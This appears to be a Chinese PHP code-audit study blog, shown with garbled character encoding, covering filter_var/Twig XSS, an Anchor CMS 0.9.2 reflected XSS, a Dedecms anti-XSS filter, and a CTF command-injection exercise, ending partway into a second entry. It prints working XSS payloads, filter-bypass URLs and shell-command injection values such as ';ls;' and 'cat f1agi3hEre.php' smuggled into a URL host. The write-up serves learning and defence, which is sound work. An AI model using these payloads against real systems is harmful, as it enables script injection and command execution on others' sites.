    <url>/code_audit/4.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day2/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1-var-filterå‡½æ•°ç¼ºé™·">PHPä»£ç å®¡è®¡å­¦ä¹ â€”â€”Day1 var_filterå‡½æ•°ç¼ºé™·</h1>
<h2 id="0x01-Day2-Twig">0x01 Day2 - Twig</h2>
<p>ä»£ç å¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// composer require &quot;twig/twig&quot;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;vendor/autoload.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $twig;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $indexTemplate = <span class="string">&#x27;&lt;img &#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;src=&quot;https://loremflickr.com/320/240&quot;&gt;&#x27;</span> .</span><br><span class="line">      <span class="string">&#x27;&lt;a href=&quot;&#123;&#123;link|escape&#125;&#125;&quot;&gt;Next slide &amp;raquo;&lt;/a&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Default twig setup, simulate loading</span></span><br><span class="line">    <span class="comment">// index.html file from disk</span></span><br><span class="line">    $loader = <span class="keyword">new</span> Twig\Loader\ArrayLoader([</span><br><span class="line">      <span class="string">&#x27;index.html&#x27;</span> =&gt; $indexTemplate</span><br><span class="line">    ]);</span><br><span class="line">    <span class="keyword">$this</span>-&gt;twig = <span class="keyword">new</span> Twig\Environment($loader);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getNexSlideUrl</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    $nextSlide = $_GET[<span class="string">&#x27;nextSlide&#x27;</span>];</span><br><span class="line">    <span class="keyword">return</span> filter_var($nextSlide, FILTER_VALIDATE_URL);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;twig-&gt;render(</span><br><span class="line">      <span class="string">&#x27;index.html&#x27;</span>,</span><br><span class="line">      [<span class="string">&#x27;link&#x27;</span> =&gt; <span class="keyword">$this</span>-&gt;getNexSlideUrl()]</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> Template())-&gt;render();</span><br></pre></td></tr></table></figure>
<p>è¿™æ®µä»£ç æ¶‰åŠåˆ°äº†PHPçš„æ¨¡æ¿å¼•æ“Twigï¼Œç›´æ¥æ¥ç®€åŒ–ä¸€ä¸‹ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $url = filter_var($_GET[<span class="string">&#x27;url&#x27;</span>], FILTER_VALIDATE_URL);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	$url = htmlspecialchars($url);</span><br><span class="line">	var_dump($url);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;&lt;a href=&#x27;<span class="subst">$url</span>&#x27;&gt; Next Slide &lt;/a&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>åˆ†åˆ«è§£é‡Šä¸€ä¸‹è¿™ä¸¤ä¸ªå‡½æ•°ï¼š</p>
<ul>
<li>
<p><a href="http://php.net/manual/zh/function.filter-var.php">filter_var </a>ï¼š(PHP 5 &gt;= 5.2.0, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šä½¿ç”¨ç‰¹å®šçš„è¿‡æ»¤å™¨è¿‡æ»¤ä¸€ä¸ªå˜é‡</p>
<p><strong>å®šä¹‰</strong> ï¼š<a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <strong>filter_var</strong> ( <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$variable</code> [, int <code>$filter</code> = FILTER_DEFAULT [, <a href="http://php.net/manual/zh/language.pseudo-types.php#language.types.mixed">mixed</a> <code>$options</code> ]] )</p>
</li>
<li>
<p><a href="http://php.net/manual/zh/function.htmlspecialchars.php">htmlspecialchars </a>ï¼š(PHP 4, PHP 5, PHP 7)</p>
<p><strong>åŠŸèƒ½</strong> ï¼šå°†ç‰¹æ®Šå­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“</p>
<p><strong>å®šä¹‰</strong> ï¼šstring <strong>htmlspecialchars</strong> ( string <code>$string</code> [, int <code>$flags</code> = ENT_COMPAT | ENT_HTML401 [, string<code>$encoding</code> = ini_get(â€œdefault_charsetâ€) [, bool <code>$double_encode</code> = <strong>TRUE</strong> ]]] )</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; &amp; (&amp; ç¬¦å·)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;</span><br><span class="line">&gt; &quot; (åŒå¼•å·)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &quot;</span><br><span class="line">&gt; &#39; (å•å¼•å·)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &amp;apos;</span><br><span class="line">&gt; &lt; (å°äºå·)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &lt;</span><br><span class="line">&gt; &gt; (å¤§äºå·)  &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;  &gt;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>é’ˆå¯¹è¿™ä¸¤å¤„çš„è¿‡æ»¤ï¼Œæˆ‘ä»¬å¯ä»¥è€ƒè™‘ä½¿ç”¨ <strong>javascriptä¼ªåè®®</strong> æ¥ç»•è¿‡ã€‚æˆ‘ä»¬ä½¿ç”¨ payload ï¼š<code>?url=javascript://commentï¼…250aalert(1)</code> ï¼Œå¯ä»¥æ‰§è¡Œ <strong>alert</strong> å‡½æ•°ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610212646.png" alt=""></p>
<p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªPayloadï¼š</p>
<p>è¿™é‡Œçš„ <strong>//</strong> åœ¨JavaScriptä¸­è¡¨ç¤ºå•è¡Œæ³¨é‡Šï¼Œæ‰€ä»¥åé¢çš„å†…å®¹å‡ä¸ºæ³¨é‡Šï¼Œé‚£ä¸ºä»€ä¹ˆä¼šæ‰§è¡Œ <strong>alert</strong> å‡½æ•°å‘¢ï¼Ÿé‚£æ˜¯å› ä¸ºæˆ‘ä»¬è¿™é‡Œç”¨äº†å­—ç¬¦ <strong>%0a</strong> ï¼Œè¯¥å­—ç¬¦ä¸ºæ¢è¡Œç¬¦ï¼Œæ‰€ä»¥ <strong>alert</strong> è¯­å¥ä¸æ³¨é‡Šç¬¦ <strong>//</strong> å°±ä¸åœ¨åŒä¸€è¡Œï¼Œå°±èƒ½æ‰§è¡Œã€‚å½“ç„¶ï¼Œè¿™é‡Œæˆ‘ä»¬è¦å¯¹ <strong>%</strong> ç™¾åˆ†å·ç¼–ç æˆ <strong>%25</strong> ï¼Œå› ä¸ºç¨‹åºå°†æµè§ˆå™¨å‘æ¥çš„payloadï¼š<code>javascript://commentï¼…250aalert(1)</code> å…ˆè§£ç æˆï¼š <code>javascript://comment%0aalert(1)</code> å­˜å‚¨åœ¨å˜é‡ <strong>$url</strong> ä¸­ï¼ˆä¸Šå›¾ç¬¬äºŒè¡Œä»£ç ï¼‰ï¼Œç„¶åç”¨æˆ·ç‚¹å‡»aæ ‡ç­¾é“¾æ¥å°±ä¼šè§¦å‘ <strong>alert</strong> å‡½æ•°ã€‚</p>
<h2 id="0x02-å®ä¾‹åˆ†æ">0x02 å®ä¾‹åˆ†æ</h2>
<p>ä»Šå¤©çš„å®ä¾‹ç”¨çš„æ˜¯ <strong>Anchor 0.9.2</strong> ç‰ˆæœ¬ï¼Œåœ¨è¯¥ç‰ˆæœ¬ä¸­ï¼Œå½“ç”¨æˆ·è®¿é—®ä¸€ä¸ªä¸å­˜åœ¨çš„URLé“¾æ¥æ—¶ï¼Œç¨‹åºä¼šè°ƒç”¨404æ¨¡æ¿ï¼Œè€Œè¿™ä¸ªæ¨¡æ¿åˆ™å­˜åœ¨XSSæ¼æ´ã€‚é—®é¢˜å­˜åœ¨äº<code>404.php</code>ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">?php</span> <span class="attr">theme_include</span>(&#x27;<span class="attr">header</span>&#x27;); ?&gt;</span></span><br><span class="line"></span><br><span class="line">	<span class="tag">&lt;<span class="name">section</span> <span class="attr">class</span>=<span class="string">&quot;content wrap&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>Page not found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line">		<span class="tag">&lt;<span class="name">p</span>&gt;</span>Unfortunately, the page <span class="tag">&lt;<span class="name">code</span>&gt;</span>/<span class="tag">&lt;<span class="name">?php</span> <span class="attr">echo</span> <span class="attr">current_url</span>(); ?&gt;</span><span class="tag">&lt;/<span class="name">code</span>&gt;</span> could not be found. Your best bet is either to try the <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;&lt;?php echo base_url(); ?&gt;&quot;</span>&gt;</span>homepage<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, try <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#search&quot;</span>&gt;</span>searching<span class="tag">&lt;/<span class="name">a</span>&gt;</span>, or go and cry in a corner (although I donâ€™t recommend the latter).<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">?php</span> <span class="attr">theme_include</span>(&#x27;<span class="attr">footer</span>&#x27;); ?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>current_url()</code>å°†è¯»å–å½“å‰ç¯å¢ƒçš„<code>SERVER['PATH_INFO']</code>çš„å€¼ï¼Œç„¶åå†å›æ˜¾åˆ°é¡µé¢ä¸Šã€‚</p>
<p>åŸæ–‡ä¸­çš„åˆ©ç”¨é“¾æ¶‰åŠå¤šä¸ªå‡½æ•°ï¼Œä½†æ˜¯æˆ‘åœ¨æœ¬åœ°ç¯å¢ƒå¤ç°è¿›è¡Œå•æ­¥è°ƒè¯•æ—¶ï¼Œå´å¹¶æ²¡æœ‰è¿›å…¥åˆ°<code>detect()</code>å‡½æ•°ä¸­ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›äº†<code>current</code>çš„å€¼ï¼Œå°è¯•äº†å¾ˆå¤šæ¬¡ä¹Ÿæ²¡æ‰¾åˆ°å¤ç°å¤±è´¥çš„åŸå› ï¼Œè¿™é‡Œå…ˆç•™ä¸€ä¸ªå‘ã€‚</p>
<p>Payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;anchor&#x2F;index.php&#x2F;&lt;script&gt;alert(&#39;www.sec-redclub.com&#39;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610232456.png" alt=""></p>
<h2 id="0x03-é˜²å¾¡æ–¹å¼">0x03 é˜²å¾¡æ–¹å¼</h2>
<p>å¯¹XSSæ¼æ´ï¼Œæˆ‘ä»¬æœ€å¥½å°±æ˜¯è¿‡æ»¤å…³é”®è¯ï¼Œå°†ç‰¹æ®Šå­—ç¬¦è¿›è¡ŒHTMLå®ä½“ç¼–ç æ›¿æ¢ï¼Œè¿™é‡Œå¼•ç”¨Dedecmsä¸­é˜²å¾¡XSSçš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">RemoveXSS</span>(<span class="params">$val</span>) </span>&#123;</span><br><span class="line">       $val = preg_replace(<span class="string">&#x27;/([\x00-\x08,\x0b-\x0c,\x0e-\x19])/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, $val);</span><br><span class="line">       $search = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;1234567890!@#$%^&amp;*()&#x27;</span>;</span><br><span class="line">       $search .= <span class="string">&#x27;~`&quot;;:?+/=&#123;&#125;[]-_|\&#x27;\\&#x27;</span>;</span><br><span class="line">       <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($search); $i++) &#123;</span><br><span class="line">          $val = preg_replace(<span class="string">&#x27;/(&amp;#[xX]0&#123;0,8&#125;&#x27;</span>.dechex(ord($search[$i])).<span class="string">&#x27;;?)/i&#x27;</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">          $val = preg_replace(<span class="string">&#x27;/(&amp;#0&#123;0,8&#125;&#x27;</span>.ord($search[$i]).<span class="string">&#x27;;?)/&#x27;</span>, $search[$i], $val); <span class="comment">// with a ;</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $ra1 = <span class="keyword">array</span>(<span class="string">&#x27;javascript&#x27;</span>, <span class="string">&#x27;vbscript&#x27;</span>, <span class="string">&#x27;expression&#x27;</span>, <span class="string">&#x27;applet&#x27;</span>, <span class="string">&#x27;meta&#x27;</span>, <span class="string">&#x27;xml&#x27;</span>, <span class="string">&#x27;blink&#x27;</span>, <span class="string">&#x27;link&#x27;</span>, <span class="string">&#x27;style&#x27;</span>, <span class="string">&#x27;script&#x27;</span>, <span class="string">&#x27;embed&#x27;</span>, <span class="string">&#x27;object&#x27;</span>, <span class="string">&#x27;iframe&#x27;</span>, <span class="string">&#x27;frame&#x27;</span>, <span class="string">&#x27;frameset&#x27;</span>, <span class="string">&#x27;ilayer&#x27;</span>, <span class="string">&#x27;layer&#x27;</span>, <span class="string">&#x27;bgsound&#x27;</span>, <span class="string">&#x27;title&#x27;</span>, <span class="string">&#x27;base&#x27;</span>);</span><br><span class="line">       $ra2 = <span class="keyword">array</span>(<span class="string">&#x27;onabort&#x27;</span>, <span class="string">&#x27;onactivate&#x27;</span>, <span class="string">&#x27;onafterprint&#x27;</span>, <span class="string">&#x27;onafterupdate&#x27;</span>, <span class="string">&#x27;onbeforeactivate&#x27;</span>, <span class="string">&#x27;onbeforecopy&#x27;</span>, <span class="string">&#x27;onbeforecut&#x27;</span>, <span class="string">&#x27;onbeforedeactivate&#x27;</span>, <span class="string">&#x27;onbeforeeditfocus&#x27;</span>, <span class="string">&#x27;onbeforepaste&#x27;</span>, <span class="string">&#x27;onbeforeprint&#x27;</span>, <span class="string">&#x27;onbeforeunload&#x27;</span>, <span class="string">&#x27;onbeforeupdate&#x27;</span>, <span class="string">&#x27;onblur&#x27;</span>, <span class="string">&#x27;onbounce&#x27;</span>, <span class="string">&#x27;oncellchange&#x27;</span>, <span class="string">&#x27;onchange&#x27;</span>, <span class="string">&#x27;onclick&#x27;</span>, <span class="string">&#x27;oncontextmenu&#x27;</span>, <span class="string">&#x27;oncontrolselect&#x27;</span>, <span class="string">&#x27;oncopy&#x27;</span>, <span class="string">&#x27;oncut&#x27;</span>, <span class="string">&#x27;ondataavailable&#x27;</span>, <span class="string">&#x27;ondatasetchanged&#x27;</span>, <span class="string">&#x27;ondatasetcomplete&#x27;</span>, <span class="string">&#x27;ondblclick&#x27;</span>, <span class="string">&#x27;ondeactivate&#x27;</span>, <span class="string">&#x27;ondrag&#x27;</span>, <span class="string">&#x27;ondragend&#x27;</span>, <span class="string">&#x27;ondragenter&#x27;</span>, <span class="string">&#x27;ondragleave&#x27;</span>, <span class="string">&#x27;ondragover&#x27;</span>, <span class="string">&#x27;ondragstart&#x27;</span>, <span class="string">&#x27;ondrop&#x27;</span>, <span class="string">&#x27;onerror&#x27;</span>, <span class="string">&#x27;onerrorupdate&#x27;</span>, <span class="string">&#x27;onfilterchange&#x27;</span>, <span class="string">&#x27;onfinish&#x27;</span>, <span class="string">&#x27;onfocus&#x27;</span>, <span class="string">&#x27;onfocusin&#x27;</span>, <span class="string">&#x27;onfocusout&#x27;</span>, <span class="string">&#x27;onhelp&#x27;</span>, <span class="string">&#x27;onkeydown&#x27;</span>, <span class="string">&#x27;onkeypress&#x27;</span>, <span class="string">&#x27;onkeyup&#x27;</span>, <span class="string">&#x27;onlayoutcomplete&#x27;</span>, <span class="string">&#x27;onload&#x27;</span>, <span class="string">&#x27;onlosecapture&#x27;</span>, <span class="string">&#x27;onmousedown&#x27;</span>, <span class="string">&#x27;onmouseenter&#x27;</span>, <span class="string">&#x27;onmouseleave&#x27;</span>, <span class="string">&#x27;onmousemove&#x27;</span>, <span class="string">&#x27;onmouseout&#x27;</span>, <span class="string">&#x27;onmouseover&#x27;</span>, <span class="string">&#x27;onmouseup&#x27;</span>, <span class="string">&#x27;onmousewheel&#x27;</span>, <span class="string">&#x27;onmove&#x27;</span>, <span class="string">&#x27;onmoveend&#x27;</span>, <span class="string">&#x27;onmovestart&#x27;</span>, <span class="string">&#x27;onpaste&#x27;</span>, <span class="string">&#x27;onpropertychange&#x27;</span>, <span class="string">&#x27;onreadystatechange&#x27;</span>, <span class="string">&#x27;onreset&#x27;</span>, <span class="string">&#x27;onresize&#x27;</span>, <span class="string">&#x27;onresizeend&#x27;</span>, <span class="string">&#x27;onresizestart&#x27;</span>, <span class="string">&#x27;onrowenter&#x27;</span>, <span class="string">&#x27;onrowexit&#x27;</span>, <span class="string">&#x27;onrowsdelete&#x27;</span>, <span class="string">&#x27;onrowsinserted&#x27;</span>, <span class="string">&#x27;onscroll&#x27;</span>, <span class="string">&#x27;onselect&#x27;</span>, <span class="string">&#x27;onselectionchange&#x27;</span>, <span class="string">&#x27;onselectstart&#x27;</span>, <span class="string">&#x27;onstart&#x27;</span>, <span class="string">&#x27;onstop&#x27;</span>, <span class="string">&#x27;onsubmit&#x27;</span>, <span class="string">&#x27;onunload&#x27;</span>);</span><br><span class="line">       $ra = array_merge($ra1, $ra2);</span><br><span class="line"></span><br><span class="line">       $found = <span class="literal">true</span>; </span><br><span class="line">       <span class="keyword">while</span> ($found == <span class="literal">true</span>) &#123;</span><br><span class="line">          $val_before = $val;</span><br><span class="line">          <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; sizeof($ra); $i++) &#123;</span><br><span class="line">             $pattern = <span class="string">&#x27;/&#x27;</span>;</span><br><span class="line">             <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; strlen($ra[$i]); $j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ($j &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;(&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;(&amp;#[xX]0&#123;0,8&#125;([9ab]);)&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;|(&amp;#0&#123;0,8&#125;([9|10|13]);)&#x27;</span>;</span><br><span class="line">                   $pattern .= <span class="string">&#x27;)*&#x27;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                $pattern .= $ra[$i][$j];</span><br><span class="line">             &#125;</span><br><span class="line">             $pattern .= <span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">             $replacement = substr($ra[$i], <span class="number">0</span>, <span class="number">2</span>).<span class="string">&#x27;&lt;x&gt;&#x27;</span>.substr($ra[$i], <span class="number">2</span>);</span><br><span class="line">             $val = preg_replace($pattern, $replacement, $val); </span><br><span class="line">             <span class="keyword">if</span> ($val_before == $val) &#123;</span><br><span class="line">                $found = <span class="literal">false</span>;</span><br><span class="line">             &#125;</span><br><span class="line">          &#125;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> $val;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h2 id="0x04-CTFç»ƒä¹ ">0x04 CTFç»ƒä¹ </h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($url) &amp;&amp; filter_var($url, FILTER_VALIDATE_URL))&#123;</span><br><span class="line">    $site_info = parse_url($url);</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/sec-redclub.com$/&#x27;</span>,$site_info[<span class="string">&#x27;host&#x27;</span>]))&#123;</span><br><span class="line">        exec(<span class="string">&#x27;curl &quot;&#x27;</span>.$site_info[<span class="string">&#x27;host&#x27;</span>].<span class="string">&#x27;&quot;&#x27;</span>, $result);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span></span><br><span class="line"><span class="string">              &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> implode(<span class="string">&#x27; &#x27;</span>, $result);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span></span><br><span class="line"><span class="string">          &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// f1agi3hEre.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag = <span class="string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>mochazzå¸ˆå‚…ç»™çš„payloadï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;cat%20f1agi3hEre.php;%23;sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>ä½†æ˜¯ç›¸åŒçš„payloadä¸èƒ½æˆåŠŸï¼Œé—®é¢˜å‡ºåœ¨<code>parse_url()</code>è§£æçš„æ—¶å€™ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[&quot;scheme&quot;]&#x3D;&gt; string(4) &quot;demo&quot; </span><br><span class="line">[&quot;host&quot;]&#x3D;&gt; string(5) &quot;&quot;;ls;&quot; </span><br><span class="line">[&quot;fragment&quot;]&#x3D;&gt; string(20) &quot;;sec-redclub.com:80&#x2F;&quot;</span><br></pre></td></tr></table></figure>
<p>è¿™æ ·å°±ä¼šå¯¼è‡´<code>perg_match</code>åŒ¹é…å¤±è´¥ã€‚æˆ‘æ¢äº†å¦å¤–ä¸€ä¸ªpayloadï¼Œç”¨äºé—­åˆæœ€åä¸€ä¸ª<code>&quot;</code>ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.153.132:8003&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611164855.png" alt=""></p>
<p>è§£é‡Šä¸€ä¸‹è¿™ä¸ªPayloadï¼š</p>
<p>å…ˆæ¥ç»•è¿‡ <strong>filter_var</strong> çš„ <strong>FILTER_VALIDATE_URL</strong> è¿‡æ»¤å™¨ï¼Œè¿™é‡Œæä¾›å‡ ä¸ªç»•è¿‡æ–¹æ³•ï¼Œå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com@sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&amp;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com?sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com&#x2F;sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com,sec-redclub.com</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;demo:&#x2F;&#x2F;demo.com:80;sec-redclub.com:80&#x2F;</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;index.php?url&#x3D;http:&#x2F;&#x2F;demo.com#sec-redclub.com</span><br><span class="line">PS:æœ€åä¸€ä¸ªpayloadçš„#ç¬¦å·ï¼Œè¯·æ¢æˆå¯¹åº”çš„urlç¼–ç  %23</span><br></pre></td></tr></table></figure>
<p>æ¥ç€è¦ç»•è¿‡ <strong>parse_url</strong> å‡½æ•°ï¼Œå¹¶ä¸”æ»¡è¶³ <strong>$site_info[â€˜hostâ€™]</strong> çš„å€¼ä»¥ <strong><a href="http://sec-redclub.com">sec-redclub.com</a></strong> ç»“å°¾</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?url&#x3D;demo:&#x2F;&#x2F;%22;ls;%22sec-redclub.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>ç¬¬ä¸€ä¸ª<code>%22</code>ç”¨äºé—­åˆå‰é¢çš„åŒå¼•å·ï¼Œåˆ†å·å¯ä»¥åœ¨Linuxç³»ç»Ÿä¸Šè¿ç»­æ‰§è¡Œå‘½ä»¤ï¼Œåé¢ä¸€ä¸ª<code>%22</code>ç”¨äºé—­åˆåé¢çš„å¼•å·ã€‚</p>
]]></content>
      <categories>
        <category>ä»£ç å®¡è®¡</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>ä»£ç å®¡è®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>PHPä»£ç å®¡è®¡â€”â€”Day3</title>
    <url>/code_audit/6.PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0%E2%80%94%E2%80%94Day4/</url>
    <content><![CDATA[<h1 id="PHPä»£ç å®¡è®¡å­¦ä¹ Day4â€”â€”strposå‡½æ•°ç¼ºé™·">PHPä»£ç å®¡è®¡å­¦ä¹ Day4â€”â€”strposå‡½æ•°ç¼ºé™·</h1>
<h2 id="0x01-False-Beard">0x01 False Beard</h2>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$user, $pass</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;loginViaXml($user, $pass);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loginViaXml</span>(<span class="params">$user, $pass</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      (!strpos($user, <span class="string">&#x27;&lt;&#x27;</span>) || !strpos($user, <span class="string">&#x27;&gt;&#x27;</span>)) &amp;&amp;</span><br><span class="line">      (!strpos($pass, <span class="string">&#x27;&lt;&#x27;</span>) || !strpos($pass, <span class="string">&#x27;&gt;&#x27;</span>))</span><br><span class="line">    ) 